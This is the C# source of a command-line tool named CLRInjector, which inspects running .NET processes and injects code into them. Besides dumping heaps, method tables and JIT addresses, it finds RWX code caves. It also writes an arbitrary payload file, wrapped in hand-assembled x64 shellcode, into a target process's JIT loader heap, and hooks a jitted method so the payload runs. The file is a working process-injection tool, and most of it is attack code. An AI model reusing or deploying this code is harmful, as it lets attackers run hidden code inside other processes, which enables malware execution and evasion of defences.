﻿// Licensed to the .NET Foundation under one or more agreements.
// The .NET Foundation licenses this file to you under the MIT license.

using Microsoft.Diagnostics.Runtime;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static CLRHeapWalker.CLRInternals;
using static CLRHeapWalker.Win32Internals;

namespace CLRHeapWalker
{
    class Program
    {

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine(@"
   _____ _      _____  _____       _           _             
  / ____| |    |  __ \|_   _|     (_)         | |            
 | |    | |    | |__) | | |  _ __  _  ___  ___| |_ ___  _ __ 
 | |    | |    |  _  /  | | | '_ \| |/ _ \/ __| __/ _ \| '__|
 | |____| |____| | \ \ _| |_| | | | |  __/ (__| || (_) | |   
  \_____|______|_|  \_\_____|_| |_| |\___|\___|\__\___/|_|   
                                 _/ |                        
                                |__/ 
");
                Console.WriteLine($"Usage: CLRInjector.exe <cmd> [args]");
                Console.WriteLine($"--ps");
                Console.WriteLine($"<pid|process_name> --dump-obj [--full]");
                Console.WriteLine($"<pid|process_name> --dump-heaps");
                Console.WriteLine($"<pid|process_name> --dump-mt <method_table>");
                Console.WriteLine($"<pid|process_name> --dump-md <method_desc>");
                Console.WriteLine($"<pid|process_name> --find-jit");
                Console.WriteLine($"<pid|process_name> --find-caves");
                Console.WriteLine($"<pid|process_name> --jit-inject <payload path> <method_desc> [cave]");
                Environment.Exit(1);
            }

            if ((args.Length >= 1 && args[0] == "--ps"))
            {
                EnumerateProcessesWithDotNetAssemblies();
                return;
            }

            int pid;
            if (!int.TryParse(args[0], out pid))
            {
                var processes = Process.GetProcessesByName(args[0]);
                if (processes.Length > 0)
                {
                    pid = processes.First().Id;
                }
                else
                {
                    Console.WriteLine($"[-] Process {args[0]} could not be found");
                    return;
                }
            }

            using (DataTarget dataTarget = DataTarget.AttachToProcess(pid, false))
            {
                foreach (ClrInfo clr in dataTarget.ClrVersions)
                {
                    using (ClrRuntime runtime = clr.CreateRuntime())
                    {
                        if (args.Length >= 2 && args[1] == "--dump-heaps")
                        {
                            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);

                            if (hProcess == IntPtr.Zero)
                            {
                                Console.WriteLine("[-] Failed to open the target process.");
                                return;
                            }
                            foreach (var jitMgr in runtime.EnumerateJitManagers())
                            {
                                Console.WriteLine($"{jitMgr.Address:X} - {jitMgr.Kind}");
                                IntPtr pCodeHeap = ReadMemoryData<IntPtr>(hProcess, (IntPtr)(jitMgr.Address + 0x10));
                                foreach (var heap in jitMgr.EnumerateNativeHeaps())
                                {
                                    Console.WriteLine($"\t- {heap.MemoryRange.Start:X}-{heap.MemoryRange.End:X} ({heap.Kind}) [{heap.State}]");
                                    CodeHeap codeHeap = ReadMemoryData<CodeHeap>(hProcess, pCodeHeap);
                                    Console.WriteLine($"\t\thpNext: {codeHeap.hpNext:X}");
                                    Console.WriteLine($"\t\tmapBase: {codeHeap.mapBase:X}");
                                    Console.WriteLine($"\t\tstartAddress: {codeHeap.startAddress:X}");
                                    Console.WriteLine($"\t\tendAddress: {codeHeap.endAddress:X}");
                                    Console.WriteLine($"\t\tmaxCodeHeapSize: {codeHeap.maxCodeHeapSize:X}");
                                    Console.WriteLine($"\t\tpHeap: {codeHeap.pHeap:X}");
                                    ExplicitControlLoaderHeap loaderHeap = ReadMemoryData<ExplicitControlLoaderHeap>(hProcess, (IntPtr)(codeHeap.pHeap + 0x08));
                                    Console.WriteLine($"\t\t\tm_pFirstBlock: {loaderHeap.m_pFirstBlock:X}");
                                    Console.WriteLine($"\t\t\tm_pAllocPtr: {loaderHeap.m_pAllocPtr:X}");
                                    Console.WriteLine($"\t\t\tm_pPtrToEndOfCommittedRegion: {loaderHeap.m_pPtrToEndOfCommittedRegion:X}");
                                    Console.WriteLine($"\t\t\tm_pEndReservedRegion: {loaderHeap.m_pEndReservedRegion:X}");
                                    Console.WriteLine($"\t\t\tm_dwReserveBlockSize: {loaderHeap.m_dwReserveBlockSize:X}");
                                    Console.WriteLine($"\t\t\tm_dwCommitBlockSize: {loaderHeap.m_dwCommitBlockSize:X}");
                                    Console.WriteLine($"\t\t\tm_pRangeList: {loaderHeap.m_pRangeList:X}");
                                    Console.WriteLine($"\t\t\tm_dwTotalAlloc: {loaderHeap.m_dwTotalAlloc:X}");
                                    Console.WriteLine($"\t\t\tm_Options: {loaderHeap.m_Options:X}");
                                    Console.WriteLine($"\t\t\tm_pFirstFreeBlock: {loaderHeap.m_pFirstFreeBlock:X}");
                                    Console.WriteLine($"\t\t\tm_reservedBlock.pNext: {loaderHeap.m_reservedBlock.pNext:X}");
                                    Console.WriteLine($"\t\t\tm_reservedBlock.pVirtualAddress: {loaderHeap.m_reservedBlock.pVirtualAddress:X}");
                                    Console.WriteLine($"\t\t\tm_reservedBlock.dwVirtualSize: {loaderHeap.m_reservedBlock.dwVirtualSize:X}");
                                    Console.WriteLine($"\t\t\tm_reservedBlock.m_fReleaseMemory: {loaderHeap.m_reservedBlock.m_fReleaseMemory:X}");
                                    pCodeHeap = (IntPtr)codeHeap.hpNext;
                                }
                            }
                            CloseHandle(hProcess);
                        }
                        if (args.Length >= 2 && args[1] == "--dump-obj")
                        {
                            if (args.Length >= 3 && args[2] == "--full")
                                DumpHeap(runtime, true);
                            else
                                DumpHeap(runtime, false);
                        }

                        if (args.Length >= 2 && args[1] == "--find-jit")
                        {
                            var addrs = GetJitAddrs(runtime);
                            foreach (var addr in addrs)
                            {
                                Console.WriteLine($"{addr.Key} - 0x{addr.Value:X}");
                            }
                        }

                        if (args.Length >= 2 && args[1] == "--find-caves")
                        {
                            if (args.Length >= 3)
                                DumpCodeCaves(pid, int.Parse(args[2]));
                            else
                                DumpCodeCaves(pid);
                        }

                        if (args.Length >= 4 && args[1] == "--jit-inject")
                        {
                            byte[] fileBytes = File.ReadAllBytes(args[2]);
                            ulong nativeCodeAddr = 0;
                            try
                            {
                                nativeCodeAddr = ulong.Parse(args[3], System.Globalization.NumberStyles.HexNumber);
                            }
                            catch (Exception ex) when (ex is FormatException || ex is ArgumentException)
                            {
                                GetJitAddrs(runtime).TryGetValue(args[3], out nativeCodeAddr);
                            }

                            if (nativeCodeAddr == 0)
                            {
                                Console.WriteLine("[-] Invalid target! Use either a method name or native code address");
                                return;
                            }

                            var method = runtime.GetMethodByInstructionPointer(nativeCodeAddr);
                            if (method == null)
                            {
                                Console.WriteLine("[-] Couldn't get from IP");
                                return;
                            }
                            ulong method_size = 0;
                            foreach (var item in method.ILOffsetMap)
                            {
                                method_size += item.EndAddress - item.StartAddress;
                            }
                            if (method_size < 12)
                            {
                                Console.WriteLine("[-] Native code is smaller than hook");
                                return;
                            }

                            ulong caveAddr = 0;
                            if (args.Length >= 5)
                                caveAddr = Convert.ToUInt64(args[4], 16);

                            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);

                            if (hProcess == IntPtr.Zero)
                            {
                                Console.WriteLine("[-] Failed to open the target process.");
                                return;
                            }

                            // Read method's first 5 bytes
                            byte[] methodHead = new byte[5];
                            if (!ReadProcessMemory(hProcess, (IntPtr)nativeCodeAddr, methodHead, methodHead.Length, out _))
                            {
                                CloseHandle(hProcess);
                                Console.WriteLine("[-] Failed to read process memory.");
                                return;
                            }
                            else
                            {
                                Console.WriteLine($"[.] Method head: {BitConverter.ToString(methodHead).Replace("-", "")}");
                            }

                            byte[] hook = {
                            0x48, 0xB8, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // movabs rax,0x1122334455667788
                            0xFF, 0xD0                                                  // call rax
                        };

                            // Shellcode prologue:
                            // Being overcautious here and saving volatile registers as well ...
                            byte[] prologue = { 
                                0x58,                   //0:  58                      pop rax
                                0x48, 0x83, 0xE8, 0x0C, //1:  48 83 e8 0c             sub    rax,0xc
                                0x50,                   //5:  50                      push rax
                                0x53,                   //6:  53                      push rbx
                                0x51,                   //7:  51                      push rcx
                                0x52,                   //8:  52                      push rdx
                                0x57,                   //9:  57                      push rdi
                                0x56,                   //a: 56                       push rsi
                                0x41, 0x50,             //b: 41 50                    push r8
                                0x41, 0x51,             //d: 41 51                    push r9
                                0x41, 0x52,             //f: 41 52                    push r10
                                0x41, 0x53,             //11: 41 53                   push r11
                                0x41, 0x54,             //13: 41 54                   push r12
                                0x41, 0x55,             //15: 41 55                   push r13
                                0x41, 0x56,             //17: 41 56                   push r14
                                0x41, 0x57 };           //19: 41 57                   push r15

                            // Shellcode restore section
                            byte[] restore = {
                            0x48, 0xB9,                                     //0:  movabs rcx,
                            0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, //2:  method addr
                            0x48, 0x89, 0x08,                               //10: mov QWORD PTR[rax],rcx
                            0x48, 0xB9,                                     //13: movabs rcx,
                            0xCC, 0xBB, 0xAA, 0x99, 0x88, 0x77, 0x66, 0x55, //15: method addr+4
                            0x48, 0x89, 0x48, 0x04 };                       //23: mov    QWORD PTR [rax+0x4],rcx

                            // Patch restore
                            for (int i = 0; i < 8; i++)
                            {
                                restore[i + 2] = methodHead[i];
                            }
                            for (int i = 0; i < 8; i++)
                            {
                                restore[i + 15] = methodHead[i + 4];
                            }

                            // call shellcode
                            byte[] callPayload = {
                            0x48, 0x83, 0xEC, 0x40,       // sub rsp,0x40
                            0xE8, 0x1C, 0x00, 0x00, 0x00, // call +28 <shellcode>
                            0x48, 0x83, 0xC4, 0x40 };     // add rsp,0x40

                            // Shellcode epilogue
                            //0:  41 5f                   pop r15
                            //2:  41 5e                   pop r14
                            //4:  41 5d                   pop r13
                            //6:  41 5c                   pop r12
                            //8:  41 5b                   pop r11
                            //a:  41 5a                   pop r10
                            //c:  41 59                   pop r9
                            //e: 41 58                    pop r8
                            //10: 5e                      pop rsi
                            //11: 5f                      pop rdi
                            //12: 5a                      pop rdx
                            //13: 59                      pop rcx
                            //14: 5b                      pop rbx
                            //15: 58                      pop rax
                            //16: ff e0                   jmp rax
                            byte[] epilogue = { 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5E, 0x5F, 0x5A, 0x59, 0x5B, 0x58, 0xFF, 0xE0 };

                            byte[] nopSled = new byte[0];
                            for (int i = 0; i < nopSled.Length; i++)
                            {
                                nopSled[i] = 0x90;
                            }
                            try
                            {
                                if (caveAddr == 0)
                                {
                                    //caveAddr = GetCodeCaves(pid,
                                    //    prologue.Length +
                                    //    restore.Length +
                                    //    callPayload.Length +
                                    //    epilogue.Length +
                                    //    nopSled.Length +
                                    //    fileBytes.Length
                                    //    ).Last();


                                    // I took a naive approach here moving loaderHeap.m_pAllocPtr to loaderHeap.m_pEndReservedRegion.
                                    // This keeps the heap available and forces the JIT Manager to create a new heap for future allocations.
                                    // There is still a chance of a race condition if loaderHeap.m_pAllocPtr is updated before its patched.
                                    var loaderHeapAddr = getExplicitLoeaderHeapAddr(runtime);
                                    var loaderHeap = ReadMemoryData<ExplicitControlLoaderHeap>(hProcess, (IntPtr)(loaderHeapAddr));
                                    int requiredSize = prologue.Length +
                                        restore.Length +
                                        callPayload.Length +
                                        epilogue.Length +
                                        nopSled.Length +
                                        fileBytes.Length;
                                    ulong availCommittedRegion = loaderHeap.m_pEndReservedRegion - loaderHeap.m_pAllocPtr;
                                    if ((ulong)requiredSize > availCommittedRegion)
                                    {
                                        throw new Exception("Available commited region is not large enough for payload");
                                    }
                                    if (!WriteBytesToProcessMemory(hProcess, (IntPtr)(loaderHeapAddr + 0x08), BitConverter.GetBytes(loaderHeap.m_pEndReservedRegion)))
                                        throw new Exception("Failed to patch m_pAllocPtr");
                                    caveAddr = loaderHeap.m_pAllocPtr;
                                }

                                //Patch hook
                                byte[] caveAddrBytes = BitConverter.GetBytes(caveAddr);
                                for (int i = 0; i < 8; i++)
                                {
                                    hook[i + 2] = caveAddrBytes[i];
                                }
                                Console.WriteLine($"[.] Patched hook: {BitConverter.ToString(caveAddrBytes).Replace("-", "")}");

                                byte[] payload = prologue.Concat(restore).Concat(callPayload).Concat(epilogue).Concat(nopSled).Concat(fileBytes).ToArray();
                                if (WriteBytesToProcessMemory(hProcess, (IntPtr)caveAddr, payload))
                                {
                                    Console.WriteLine($"[+] Payload written to 0x{caveAddr:X}");
                                }
                                else
                                {
                                    throw new Exception($"Failed writting payload to 0x{caveAddr:X}");
                                }

                                if (WriteBytesToProcessMemory(hProcess, (IntPtr)nativeCodeAddr, hook))
                                {
                                    Console.WriteLine($"[+] Hook written to 0x{nativeCodeAddr:X}");
                                }
                                else
                                {
                                    throw new Exception($"Failed writting hook to 0x{nativeCodeAddr:X}");
                                }
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine($"[-] {ex.Message}");
                            }
                            finally { CloseHandle(hProcess); }
                        }

                        if (args.Length == 1 || (args.Length >= 2 && args[1] == "--dump-obj"))
                        {
                            if (args.Length >= 3 && args[2] == "--full")
                                DumpHeap(runtime, true);
                            else
                                DumpHeap(runtime, false);
                        }

                        if (args.Length >= 3 && args[1] == "--dump-mt")
                        {
                            // --dump-mt argument provided, generate method table dump
                            UInt64 methodTable = Convert.ToUInt64(args[2], 16);
                            if (args.Length >= 4 && args[3] == "--full")
                                DumpMt(runtime, methodTable, true);
                            else
                                DumpMt(runtime, methodTable, false);
                        }

                        if (args.Length >= 3 && args[1] == "--dump-md")
                        {
                            // --dump-md argument provided, generate method descriptor dump
                            UInt64 methodDesc = Convert.ToUInt64(args[2], 16);
                            DumpMd(runtime, methodDesc);
                        }
                    }
                }
            }
        }

        static bool WriteBytesToProcessMemory(IntPtr hProcess, IntPtr remoteAddress, byte[] data)
        {
            int bytesWritten;
            return WriteProcessMemory(hProcess, remoteAddress, data, (uint)data.Length, out bytesWritten);
        }
        static MEMORY_BASIC_INFORMATION[] GetRWXMemorySegments(int pid)
        {
            IntPtr process = IntPtr.Zero;
            IntPtr offset = IntPtr.Zero;
            List<MEMORY_BASIC_INFORMATION> segments = new List<MEMORY_BASIC_INFORMATION>();

            process = OpenProcess(MAXIMUM_ALLOWED, false, pid);
            if (process != IntPtr.Zero)
            {
                try
                {
                    while (VirtualQueryEx(process, offset, out MEMORY_BASIC_INFORMATION mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                    {
                        offset = (IntPtr)((Int64)mbi.BaseAddress + (Int64)mbi.RegionSize);
                        if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE)
                        {
                            segments.Add(mbi);
                        }
                    }
                }
                finally
                {
                    offset = IntPtr.Zero;
                    CloseHandle(process);
                }
            }
            return segments.ToArray();
        }

        static void DumpCodeCaves(int pid, int size = 512)
        {
            foreach (var mbi in GetRWXMemorySegments(pid))
            {
                Console.WriteLine($"\tRWX: 0x{mbi.BaseAddress.ToInt64():X}");
                foreach (var cave in GetZeroSequences(pid, mbi.BaseAddress, (long)mbi.RegionSize, size))
                {
                    Console.WriteLine($"\t\tZero Sequence at 0x{cave:X}");
                }
            }
        }

        //static IEnumerable<ulong> GetCodeCaves(int pid, int size = 512)
        //{
        //    List<ulong> caves = new List<ulong> { };
        //    foreach (var mbi in GetRWXMemorySegments(pid))
        //    {
        //        var c = GetZeroSequences(pid, mbi.BaseAddress, (long)mbi.RegionSize, size);
        //        caves.AddRange(c);
        //    }
        //    return caves;
        //}

        private static IEnumerable<ulong> GetZeroSequences(int pid, IntPtr baseAddress, Int64 regionSize, int size = 512)
        {
            byte[] buffer = new byte[size];
            List<ulong> caves = new List<ulong> { };


            var process = OpenProcess(MAXIMUM_ALLOWED, false, pid);
            if (process != IntPtr.Zero)
            {

                for (Int64 offset = 0; offset < regionSize; offset += size)
                {
                    int bytesRead;
                    if (ReadProcessMemory(process, (IntPtr)(baseAddress.ToInt64() + offset), buffer, size, out bytesRead) && bytesRead == size)
                    {
                        if (IsBufferZero(buffer))
                        {
                            caves.Add((UInt64)((Int64)baseAddress + offset));
                        }
                    }
                }
            }
            CloseHandle(process);
            return caves.ToArray();
        }

        private static bool IsBufferZero(byte[] buffer)
        {
            foreach (byte value in buffer)
            {
                if (value != 0)
                {
                    return false;
                }
            }
            return true;
        }

        static void EnumerateProcessesWithDotNetAssemblies()
        {
            // Get all processes
            Process[] processes = Process.GetProcesses();
            Parallel.ForEach(processes, process =>
            {
                {
                    try
                    {
                        // Try to access the process modules
                        ProcessModuleCollection modules = process.Modules;

                        // Check if there are any .NET assemblies loaded
                        bool hasDotNetAssemblies = modules.Cast<ProcessModule>().Any(module =>
                        {
                            try
                            {
                                AssemblyName assembly = AssemblyName.GetAssemblyName(module.FileName);
                                return true;
                            }
                            catch (FileNotFoundException)
                            {
                                return false;
                            }
                            catch (BadImageFormatException)
                            {
                                // Ignore non-.NET assemblies
                                return false;
                            }
                        });

                        // If the process has .NET assemblies loaded, print its information
                        if (hasDotNetAssemblies)
                        {
                            Console.WriteLine($"[.] {process.ProcessName} [{process.Id}]");
                        }
                    }
                    catch (Exception)
                    {
                        // Handle exceptions (e.g., AccessDenied) when accessing process information
                        //Console.WriteLine($"[-] Error accessing process {process.Id}: {ex.Message}");
                        return;
                    }
                }
            });
        }

        private static Dictionary<string, ulong> GetJitAddrs(ClrRuntime runtime)
        {
            HashSet<ulong> mts = new HashSet<ulong>();
            Dictionary<string, ulong> addrs = new Dictionary<string, ulong>();
            foreach (ClrObject obj in runtime.Heap.EnumerateObjects())
            {
                if (obj.Type != null)
                {
                    mts.Add(obj.Type.MethodTable);
                }
            }
            var loaderCodeHeaps = getLoaderCodeHeaps(runtime);
            if (loaderCodeHeaps.Length == 0)
            {
                return addrs;
            }
            foreach (var mt in mts)
            {
                ClrType? clrType = runtime.GetTypeByMethodTable(mt);
                if (clrType == null)
                {
                    continue;
                }
                foreach (ClrMethod method in clrType.Methods)
                {
                    foreach (var loaderCodeHeap in loaderCodeHeaps)
                    {
                        if (
                            method.NativeCode >= loaderCodeHeap.MemoryRange.Start &&
                            method.NativeCode <= loaderCodeHeap.MemoryRange.End
                        )
                        {
                            addrs[$"{clrType.Name}.{method.Name}"] = method.NativeCode;
                            break;
                        }
                    }
                }
            }
            return addrs;
        }

        private static void DumpHeap(ClrRuntime runtime, bool full = false)
        {
            //Dictionary<UInt64, (int Count, UInt64 Size, string Name)> stats = new Dictionary<UInt64, (int Count, UInt64 Size, string Name)>();
            ClrHeap heap = runtime.Heap;
            HashSet<ulong> mts = new HashSet<ulong>();
            Console.WriteLine("{0,16} {1,16} {2,8} {3}", "Object", "MethodTable", "Size", "Type");
            foreach (ClrObject obj in heap.EnumerateObjects())
            {
                if (obj.Type == null)
                {
                    continue;
                }
                Console.WriteLine($"{obj.Address:x16} {obj.Type.MethodTable:x16} {obj.Size,8:D} {obj.Type.Name}");

                //if (!stats.TryGetValue(obj.Type.MethodTable, out (int Count, UInt64 Size, string Name) item))
                //    item = (0, 0, obj.Type.Name);

                //stats[obj.Type.MethodTable] = (item.Count + 1, item.Size + obj.Size, item.Name);
                mts.Add(obj.Type.MethodTable);
            }
            if (full)
            {
                Console.WriteLine("\nMethod tables:\n");
                foreach (var mt in mts)
                {
                    DumpMt(runtime, mt, full);
                    Console.WriteLine();
                }
            }
        }

        private static void DumpMt(ClrRuntime runtime, UInt64 methodTable, bool detailed = false)
        {
            Console.WriteLine($"Dumping method table {methodTable:X}");
            ClrType? clrType = runtime.GetTypeByMethodTable(methodTable);
            if (clrType != null)
            {
                Console.WriteLine($"Method Table: {clrType.MethodTable:x16}");
                Console.WriteLine($"Name: {clrType.Name}");

                Console.WriteLine("\nMethod Descs:");
                foreach (ClrMethod method in clrType.Methods)
                {
                    Console.WriteLine($"    {method.MethodDesc:x16} {method.Name}");
                    if (detailed)
                    {
                        DumpMd(runtime, method.MethodDesc);
                    }
                }
            }
            else
            {
                Console.WriteLine($"Method Table {methodTable:x16} not found.");
            }
        }

        private static void DumpMd(ClrRuntime runtime, UInt64 methodDescHandle)
        {
            Console.WriteLine($"Dumping method descriptor {methodDescHandle:X}");
            ClrMethod? method = runtime.GetMethodByHandle(methodDescHandle);
            if (method != null)
            {
                int pid = runtime.DataTarget.DataReader.ProcessId;
                IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to open the target process.");
                    return;
                }

                try
                {
                    CoreClrMethodDesc methodDesc = ReadMemoryData<CoreClrMethodDesc>(hProcess, (IntPtr)methodDescHandle);
                    Console.WriteLine($"Class:                          {method.Type.Name}");
                    Console.WriteLine($"Name:                           {method.Name}");
                    Console.WriteLine($"Signature:                      {method.Signature}");
                    Console.WriteLine($"MethodTable:                    0X{method.Type.MethodTable:X}");
                    Console.WriteLine($"mdToken:                        0x{method.MetadataToken:X}");
                    Console.WriteLine($"IsJitted:                       {method.CompilationType == MethodCompilationType.Jit} [{method.CompilationType}]");
                    Console.WriteLine($"CodeAddr:                       0x{method.NativeCode:X}");
                    Console.WriteLine($"m_wFlags3AndTokenRemainder:     0x{methodDesc.m_wFlags3AndTokenRemainder:X}");
                    Console.WriteLine($"m_chunkIndex:                   0x{methodDesc.m_chunkIndex:X}");
                    Console.WriteLine($"m_bFlags2:                      0x{methodDesc.m_bFlags2:X}");
                    Console.WriteLine($"m_wSlotNumber:                  0x{methodDesc.m_wSlotNumber:X}");
                    Console.WriteLine($"m_wFlags:                       0x{methodDesc.m_wFlags:X}");
                    Console.WriteLine($"TempEntry:                      0x{methodDesc.TempEntry:X}");

                }
                finally
                {
                    CloseHandle(hProcess);
                }
            }
            else
            {
                Console.WriteLine($"Method Descriptor {methodDescHandle:x16} not found.");
            }
        }

        static ulong getExplicitLoeaderHeapAddr(ClrRuntime runtime)
        {
            IntPtr hProcess = OpenProcess(MAXIMUM_ALLOWED, false, runtime.DataTarget.DataReader.ProcessId);
            ulong loaderHeapAddr = 0;
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to open the target process.");
                return 0;
            }
            foreach (var jitMgr in runtime.EnumerateJitManagers())
            {
                IntPtr pCodeHeap = ReadMemoryData<IntPtr>(hProcess, (IntPtr)(jitMgr.Address + 0x10));
                foreach (var heap in jitMgr.EnumerateNativeHeaps())
                {
                    CodeHeap codeHeap = ReadMemoryData<CodeHeap>(hProcess, pCodeHeap);
                    if (heap.Kind == NativeHeapKind.LoaderCodeHeap && heap.State == ClrNativeHeapState.Active)
                    {
                        loaderHeapAddr = codeHeap.pHeap + 0x08;
                        var loaderHeap = ReadMemoryData<ExplicitControlLoaderHeap>(hProcess, (IntPtr)(codeHeap.pHeap + 0x08));
                        ulong availCommittedRegion = loaderHeap.m_pEndReservedRegion - loaderHeap.m_pAllocPtr;
                        if (availCommittedRegion > 0)
                        {
                            break;
                        }
                    }
                    pCodeHeap = (IntPtr)codeHeap.hpNext;
                }
            }
            CloseHandle(hProcess);
            return loaderHeapAddr;
        }

        static ClrNativeHeapInfo[] getLoaderCodeHeaps(ClrRuntime runtime)
        {
            List<ClrNativeHeapInfo> heaps = new List<ClrNativeHeapInfo>();
            foreach (var jitMgr in runtime.EnumerateJitManagers())
            {
                if (jitMgr.Kind != CodeHeapKind.Loader)
                    continue;
                foreach (var heap in jitMgr.EnumerateNativeHeaps())
                {
                    if (heap.Kind == NativeHeapKind.LoaderCodeHeap && heap.State == ClrNativeHeapState.Active)
                        heaps.Add(heap);
                }
            }
            return heaps.ToArray();
        }
        static T ReadMemoryData<T>(IntPtr hProcess, IntPtr addr)
        {
            T _struct;

            byte[] buffer = new byte[Marshal.SizeOf(typeof(T))];

            // Read the metadata header from the process
            if (ReadProcessMemory(hProcess, addr, buffer, buffer.Length, out _))
            {
                GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
                try
                {
                    object? data = Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
                    if (data != null)
                    {
                        _struct = (T)data;
                        return _struct;
                    }
                    throw new NullReferenceException();
                }
                finally
                {
                    handle.Free();
                }
            }
            else
            {
                throw new Exception("Failed to read memory");
            }
        }
    }
}